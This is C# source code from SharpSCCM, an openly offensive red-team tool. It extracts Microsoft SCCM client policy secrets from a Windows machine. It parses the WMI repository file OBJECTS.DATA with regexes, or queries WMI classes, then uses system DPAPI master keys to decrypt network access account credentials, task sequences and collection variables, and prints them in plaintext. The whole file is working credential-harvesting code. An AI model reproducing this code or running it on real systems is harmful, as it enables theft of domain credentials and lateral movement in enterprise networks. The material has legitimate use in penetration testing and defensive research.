using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpSCCM
{
    public class Credentials
    {
        public static void LocalSecretsDisk(bool reg = true)
        {
            // Thanks to @guervild on GitHub for contributing this code to SharpDPAPI
            Console.WriteLine($"[+] Retrieving secret blobs from CIM repository\n");

            string fileData = "";
            MemoryStream ms = new MemoryStream();

            // Path of the CIM repository
            string path = "";
            if (!Environment.Is64BitProcess)
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\Sysnative\\Wbem\\Repository\\OBJECTS.DATA";
            }
            else
            {
                path = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
            }

            if (File.Exists(path))
            {
                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                using (var sr = new StreamReader(fs, Encoding.Default))
                {
                    fileData = sr.ReadToEnd();
                }

                // Define patterns to match in OBJECTS.DATA
                var regexes = new Dictionary<string, Regex>()
                {
                    { "networkAccessAccounts", new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(?<NetworkAccessPassword>.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(?<NetworkAccessUsername>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) },
                    { "taskSequences" , new Regex(@"</SWDReserved>.*<PolicySecret Version=""1""><!\[CDATA\[(?<TaskSequence>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) },
                    { "collectionVariables", new Regex(@"CCM_CollectionVariable\x00\x00(?<CollectionVariableName>.*?)\x00\x00.*<PolicySecret Version=""1""><!\[CDATA\[(?<CollectionVariableValue>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) },
                    { "allSecrets", new Regex(pattern: @"<PolicySecret Version=""1""><!\[CDATA\[(?<OtherSecret>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) }
                };

                // Inspect OBJECTS.DATA for matches and convert the MatchCollection objects to List<Match> so they can be compared
                var matches = new Dictionary<string, List<Match>>()
                {
                    { "network access account", regexes["networkAccessAccounts"].Matches(fileData).Cast<Match>().ToList() },
                    { "task sequence", regexes["taskSequences"].Matches(fileData).Cast<Match>().ToList() },
                    { "collection variable", regexes["collectionVariables"].Matches(fileData).Cast<Match>().ToList() },
                    { "other", regexes["allSecrets"].Matches(fileData).Cast<Match>().ToList() }
                };

                // Don't touch DPAPI unless there are secrets to decrypt
                if (matches["other"].Count > 0)
                {
                    Dictionary<string, string> masterkeys;
                    masterkeys = Dpapi.TriageSystemMasterKeys(reg);

                    // Decrypt each secret type if there are secrets to decrypt
                    foreach (var matchKeyValuePair in matches)
                    {
                        if (matchKeyValuePair.Value.Count > 0)
                        {
                            Console.WriteLine($"\n[+] Decrypting {matchKeyValuePair.Value.Count} {matchKeyValuePair.Key} secrets");

                            for (int index = 0; index < matchKeyValuePair.Value.Count; index++)
                            {
                                for (int idxGroup = 1; idxGroup < matchKeyValuePair.Value[index].Groups.Count; idxGroup++)
                                {
                                    try
                                    {

                                        // Add collection variable names and values together
                                        if (matchKeyValuePair.Value[index].Groups[idxGroup].Name == "CollectionVariableName")
                                        {
                                            string collectionVariableValue = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup + 1].Value, masterkeys);
                                            Console.WriteLine($"\n    CollectionVariableName:  {matchKeyValuePair.Value[index].Groups[idxGroup].Value}");
                                            Console.WriteLine($"    CollectionVariableValue: {collectionVariableValue}");
                                        }
                                        // Add network access usernames and passwords together
                                        else if (matchKeyValuePair.Value[index].Groups[idxGroup].Name == "NetworkAccessPassword")
                                        {
                                            string networkAccessUsername = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup + 1].Value, masterkeys);
                                            string networkAccessPassword = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup].Value, masterkeys);
                                            Console.WriteLine($"\n    NetworkAccessUsername: {networkAccessUsername}");
                                            Console.WriteLine($"    NetworkAccessPassword: {networkAccessPassword}");
                                            if (networkAccessUsername.StartsWith("00 00 0E 0E 0E") || networkAccessPassword.StartsWith("00 00 0E 0E 0E"))
                                            {
                                                Console.WriteLine("    [!] At the point in time this secret was downloaded, SCCM was configured to use the client's machine account instead of NAA");
                                            }
                                        }
                                        else if (matchKeyValuePair.Value[index].Groups[idxGroup].Name == "CollectionVariableValue" || matchKeyValuePair.Value[index].Groups[idxGroup].Name == "NetworkAccessUsername")
                                        {
                                            // Do nothing, these are already added
                                        }
                                        else 
                                        {
                                            string secretPlaintext = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup].Value, masterkeys);
                                            Console.WriteLine($"\n    Plaintext secret: {secretPlaintext}");
                                        }
                                        
                                        // Remove secret type from remaining secrets to display, courtesy of ChatGPT
                                        if (matchKeyValuePair.Key != "other")
                                        {
                                            matches["other"].RemoveAll(item1 => matchKeyValuePair.Value.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        Console.WriteLine("\n[!] Data was not decrypted\n");
                                        Console.WriteLine($"    Protected data: {matchKeyValuePair.Value[index].Groups[idxGroup].Value}");
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\n[!] No policy secrets found");
                }
            }
            else
            {
                Console.WriteLine("\n[!] OBJECTS.DATA does not exist or is not readable\n");
            }
            Console.WriteLine();
        }

        public static void DecryptLocalCollectionVariablesWmi(ManagementObjectCollection collectionVariables, Dictionary<string, string> masterkeys)
        {
            Console.WriteLine("[+] Decrypting collection variables\n");
            foreach (ManagementObject collectionVariable in collectionVariables)
            {
                string collectionVariableName = collectionVariable["Name"].ToString();
                string protectedCollectionVariableValue = collectionVariable["Value"].ToString().Split('[')[2].Split(']')[0];
                try
                {
                    string plaintextCollectionVariableValue = Dpapi.Execute(protectedCollectionVariableValue, masterkeys);
                    Console.WriteLine("    CollectionVariableName:  {0}", collectionVariableName);
                    Console.WriteLine("    CollectionVariableValue: {0}", plaintextCollectionVariableValue);
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] Data was not decrypted\n");
                    Console.WriteLine("    CollectionVariableName:  {0}", collectionVariableName);
                    Console.WriteLine("    Protected CollectionVar: {0}", protectedCollectionVariableValue);
                }
            }
        }

        public static void DecryptLocalNetworkAccessAccountsWmi(ManagementObjectCollection networkAccessAccounts, Dictionary<string, string> masterkeys)
        {
            Console.WriteLine("[+] Decrypting network access account credentials\n");
            foreach (ManagementObject account in networkAccessAccounts)
            {
                string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                Array.Resize(ref protectedUsernameBytes, length);

                try
                {
                    string username = Dpapi.Execute(protectedUsername, masterkeys);
                    string password = Dpapi.Execute(protectedPassword, masterkeys);

                    if (username.StartsWith("00 00 0E 0E 0E") || password.StartsWith("00 00 0E 0E 0E"))
                    {
                        Console.WriteLine("[!] SCCM is configured to use the client's machine account instead of NAA\n");
                    }
                    else
                    {
                        Console.WriteLine("    NetworkAccessUsername: {0}", username);
                        Console.WriteLine("    NetworkAccessPassword: {0}", password);
                        Console.WriteLine();
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] Data was not decrypted\n");
                    Console.WriteLine("    Protected NetworkAccessUsername: {0}", protectedUsername);
                    Console.WriteLine("    Protected NetworkAccessPassword: {0}", protectedPassword);
                }
            }
        }

        public static void DecryptLocalTaskSequencesWmi(ManagementObjectCollection taskSequences, Dictionary<string, string> masterkeys)
        {
            Console.WriteLine("[+] Decrypting task sequences\n");
            foreach (ManagementObject taskSequence in taskSequences)
            {
                string protectedTaskSequenceValue = taskSequence["TS_Sequence"].ToString().Split('[')[2].Split(']')[0];
                try
                {
                    string plaintextTaskSequenceValue = Dpapi.Execute(protectedTaskSequenceValue, masterkeys);
                    Console.WriteLine("    Plaintext task sequence: {0}", plaintextTaskSequenceValue);
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] Data was not decrypted\n");
                    Console.WriteLine("    Protected task sequence: {0}", protectedTaskSequenceValue);
                }
            }
        }

        public static void LocalSecretsWmi(bool reg)
        {
            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("127.0.0.1", "root\\ccm\\policy\\Machine\\ActualConfig");
            Console.WriteLine();
            Console.WriteLine("[+] Retrieving network access account blobs via WMI");
            ManagementObjectCollection networkAccessAccounts = MgmtUtil.GetClassInstances(wmiConnection, "CCM_NetworkAccessAccount");
            Console.WriteLine("[+] Retrieving task sequence blobs via WMI");
            ManagementObjectCollection taskSequences = MgmtUtil.GetClassInstances(wmiConnection, wmiClass: "CCM_TaskSequence");
            Console.WriteLine("[+] Retrieving collection variable blobs via WMI");
            ManagementObjectCollection collectionVariables = MgmtUtil.GetClassInstances(wmiConnection, "CCM_CollectionVariable");
            Console.WriteLine();

            // Don't touch DPAPI unless there are secrets to decrypt
            if (networkAccessAccounts.Count > 0 || taskSequences.Count > 0 || collectionVariables.Count > 0)
            {
                Dictionary<string, string> masterkeys = Dpapi.TriageSystemMasterKeys(reg);
                Console.WriteLine();
                if (networkAccessAccounts.Count > 0)
                {
                    DecryptLocalNetworkAccessAccountsWmi(networkAccessAccounts, masterkeys);
                }
                else
                {
                    Console.WriteLine("[+] No network access accounts were found");
                }
                if (taskSequences.Count > 0)
                {
                    DecryptLocalTaskSequencesWmi(taskSequences, masterkeys);
                }
                else
                {
                    Console.WriteLine("[+] No task sequences were found");
                }
                if (collectionVariables.Count > 0)
                {
                    DecryptLocalCollectionVariablesWmi(collectionVariables, masterkeys);
                }
                else
                {
                    Console.WriteLine("[+] No collection variables were found");
                }
                Console.WriteLine();
            }
            else
            {
                Console.WriteLine("[+] Found 0 instances of policy secrets in the local WMI repository.\n");
                Console.WriteLine("[+] This could mean that the SCCM environment does not have any secrets configured (but may have previously)");
                Console.WriteLine("[+] Run 'SharpSCCM local secrets disk' to retrieve secrets from machines that were previously SCCM clients");
                Console.WriteLine("[+] or had secrets that were modified or deleted\n");
            }
        }
    }
}